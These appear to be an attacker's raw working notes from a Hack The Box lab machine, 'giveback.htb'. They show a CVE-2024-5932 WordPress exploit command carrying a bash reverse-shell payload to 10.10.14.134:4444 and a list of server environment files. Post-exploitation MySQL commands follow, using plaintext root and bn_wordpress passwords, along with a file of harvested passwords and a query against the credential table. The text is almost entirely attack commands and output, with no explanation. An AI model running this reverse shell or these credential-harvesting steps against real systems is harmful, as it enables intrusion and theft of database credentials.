python3 CVE-2024-5932-rce.py \
  -u http://giveback.htb/donations/the-things-we-need/ \
  -c "/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.134/4444 0>&1'"
/opt/bitnami/apache/bin/envvars-std
/opt/bitnami/apache/bin/envvars
/opt/bitnami/apache/modules/mod_env.so
/opt/bitnami/apache/modules/mod_setenvif.so
/opt/bitnami/apache/include/apr-1/apr_env.h
/opt/bitnami/apache/manual/env.html.ko.euc-kr
/opt/bitnami/apache/manual/env.html
/opt/bitnami/apache/manual/env.html.ja.utf8
/opt/bitnami/apache/manual/env.html.fr.utf8
/opt/bitnami/apache/manual/mod/mod_setenvif.html.ko.euc-kr
/opt/bitnami/apache/manual/mod/mod_env.html.fr.utf8
/opt/bitnami/apache/manual/mod/mod_env.html.ko.euc-kr
/opt/bitnami/apache/manual/mod/mod_setenvif.html.en
/opt/bitnami/apache/manual/mod/mod_env.html.en
/opt/bitnami/apache/manual/mod/mod_setenvif.html.ja.utf8
/opt/bitnami/apache/manual/mod/mod_env.html.tr.utf8
/opt/bitnami/apache/manual/mod/mod_env.html.ja.utf8
/opt/bitnami/apache/manual/mod/mod_setenvif.html.fr.utf8
/opt/bitnami/apache/manual/mod/mod_env.html
/opt/bitnami/apache/manual/mod/mod_setenvif.html.tr.utf8
/opt/bitnami/apache/manual/mod/mod_setenvif.html
/opt/bitnami/apache/manual/env.html.tr.utf8
/opt/bitnami/apache/manual/env.html.en
/opt/bitnami/php/etc/environment.conf
/opt/bitnami/php/etc.default/environment.conf
/opt/bitnami/scripts/apache-env.sh
/opt/bitnami/scripts/mysql-client-env.sh
/opt/bitnami/scripts/wordpress-env.sh
/opt/bitnami/scripts/php-env.sh

<wordpress-68d4db958f-5nqmf:/opt/bitnami/wordpress$ mysql -h beta-vino-wp-mariadb -u root -p'sW5sp4syetre32828383kE4oS' -e "SHOW DATABASES;"
< -p'sW5sp4syetre32828383kE4oS' -e "SHOW DATABASES;"
mysql: Deprecated program name. It will be removed in a future release, use '/opt/bitnami/mysql/bin/mariadb' instead
Database
bitnami_wordpress
information_schema
mysql
performance_schema
sys
test

[Nov 04, 2025 - 00:35:58 (CET)] exegol-htb /workspace # cat pass.txt                   
sW5sp4spa3u7RLyetrekE4oS 
sW5sp4syetre32828383kE4oS 
O8F7KR5zGi


mysql -h beta-vino-wp-mariadb -u root -p'sW5sp4syetre32828383kE4oS' -e "SHOW DATABASES;"
mysql -h beta-vino-wp-mariadb -u bn_wordpress -p'sW5sp4spa3u7RLyetrekE4oS' -e "SHOW DATABASES;"

mysql -h beta-vino-wp-mariadb -u bn_wordpress -p'sW5sp4spa3u7RLyetrekE4oS' -D bitnami_wordpress -e "SHOW TABLES;"
mysql -h beta-vino-wp-mariadb -u root -p'sW5sp4syetre32828383kE4oS' -D mysql -e "select * from global_priv;"

User	Password